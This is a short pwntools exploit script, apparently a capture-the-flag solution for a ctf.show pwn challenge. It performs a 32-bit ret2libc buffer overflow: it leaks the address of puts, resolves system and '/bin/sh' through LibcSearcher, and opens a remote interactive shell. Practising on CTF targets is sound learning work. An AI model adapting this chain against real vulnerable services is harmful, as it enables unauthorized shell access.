from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

#p = process('./pwn')
p = remote('pwn.challenge.ctf.show', 28274)

elf = ELF('./pwn')
ctfshow_addr = elf.sym['ctfshow']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pyload = b'A' *140 + p32(puts_plt) + p32(ctfshow_addr) + p32(puts_got)
p.sendline(pyload)

data = p.recv(4)
puts_addr = u32(data)
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

pyload2 = b'A' *140 + p32(system_addr) + p32(ctfshow_addr) + p32(binsh_addr)
p.sendline(pyload2)
p.interactive()
